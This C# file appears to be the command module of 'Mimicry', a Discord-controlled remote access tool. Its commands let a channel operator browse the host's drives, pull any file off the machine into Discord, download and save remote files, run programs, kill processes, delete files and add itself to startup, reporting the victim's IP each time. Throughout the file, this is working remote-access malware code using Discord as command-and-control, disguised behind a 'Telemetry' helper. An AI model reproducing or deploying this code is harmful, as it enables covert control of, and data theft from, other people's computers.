using Discord.Commands;
using Discord;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Mimicry.Modules
{
    public class RemoteControl : ModuleBase<SocketCommandContext>
    {
        Telemetry tlm = new Telemetry();
        [Command("rc.dir")]
        public async Task rcdir(string path)
        {
            string res = tlm.ShowStructure(path);
            await Context.Channel.SendMessageAsync(res);
        }
        [Command("rc.dir")]
        public async Task rcdir()
        {
            string path = "C:\\";
            string res = tlm.ShowStructure(path);
            await Context.Channel.SendMessageAsync(res);
        }
        [Command("rc.get")]
        public async Task getfile(string path)
        {
            if (File.Exists(path))
            {
                tlm.LogInfo("USER: rc.get " + path);
                await Context.Channel.SendFileAsync(path);
            }
            else
            {
                await Context.Channel.SendMessageAsync("Incorrect path!");
            }
        }
        [Command("rc.load")]
        public async Task loadfile(string loadPath)
        {
            string name = loadPath;
            string url = Context.Message.Attachments.FirstOrDefault().Url;
            string dest = tlm.LoadFile(url, name);
            if (dest != "-1")
            {
                await Context.Channel.SendMessageAsync("Loaded your file as " + dest + "@" + tlm.getIP());
            }
            else
            {
                await Context.Channel.SendMessageAsync("Could not load the file @" + tlm.getIP() + ", try choosing another path");
            }
        }
        [Command("rc.del")]
        public async Task delfile(string path)
        {
            string name = path;
            string res = tlm.DelFile(path);
            switch (res)
            {
                case "-1":
                    await Context.Channel.SendMessageAsync("Could not find file " + path + "@" + tlm.getIP());
                    break;
                case "-2":
                    await Context.Channel.SendMessageAsync("Could not delete file " + path + "@" + tlm.getIP() + " due to security policy");
                    break;
                default:
                    await Context.Channel.SendMessageAsync("Successfully deleted file " + path + "@" + tlm.getIP());
                    break;
            }
        }
        [Command("rc.exec")]
        public async Task Execute(string path)
        {
            int res = tlm.Execute(path);
            switch (res)
            {
                case -1:
                    await Context.Channel.SendMessageAsync("Could not find file " + path + "@" + tlm.getIP());
                    break;
                case -2:
                    await Context.Channel.SendMessageAsync("File " + path + "@" + tlm.getIP() + " cannot be executed");
                    break;
                case 0:
                    await Context.Channel.SendMessageAsync("Successfully executed " + path + "@" + tlm.getIP());
                    break;
            }
        }

        [Command("rc.exec")]
        public async Task Execute(string path, [Remainder]string args)
        {
            int res = tlm.ExecuteWithArgs(path, args);
            switch (res)
            {
                case -1:
                    await Context.Channel.SendMessageAsync("Could not find file " + path + "@" + tlm.getIP());
                    break;
                case -2:
                    await Context.Channel.SendMessageAsync("File " + path + "@" + tlm.getIP() + " cannot be executed");
                    break;
                case 0:
                    await Context.Channel.SendMessageAsync("Successfully executed " + path + "@" + tlm.getIP());
                    break;
            }
        }

        [Command("rc.getproc")]
        public async Task GetProcesses()
        {
            string procs = tlm.GetProcesses();
            await Context.Channel.SendMessageAsync("Processes@" + tlm.getIP());
            try
            {
                await Context.Channel.SendMessageAsync(procs);
            }
            catch (ArgumentException)
            {
                tlm.GetProcessesFile();
                await Context.Channel.SendFileAsync(Telemetry.mimproc, "Text is too large, sending as file.");
                tlm.TerminateProcessesFile();
            }            
        }

        [Command("rc.startup")]
        public async Task Startup([Remainder]string val)
        {
            switch (val)
            {
                case "1":
                    tlm.SetUnsetStartUp(true);
                    await Context.Channel.SendMessageAsync("Added Mimicry@" + tlm.getIP() + " to startup");
                    break;
                case "0":
                    tlm.SetUnsetStartUp(false);
                    await Context.Channel.SendMessageAsync("Removed Mimicry@" + tlm.getIP() + " from startup");
                    break;
                default:
                    await Context.Channel.SendMessageAsync("Cannot resolve the argument");
                    break;
            }
        }

        [Command("rc.kill")]
        public async Task Kill([Remainder]string val)
        {
            string res = tlm.KillProcess(val);
            if (res == "-1")
            {
                await Context.Channel.SendMessageAsync("Could not kill the process@" + tlm.getIP());
            }
            else
            {
                await Context.Channel.SendMessageAsync("Successfully killed process@" + tlm.getIP());
            }
        }
    }
}
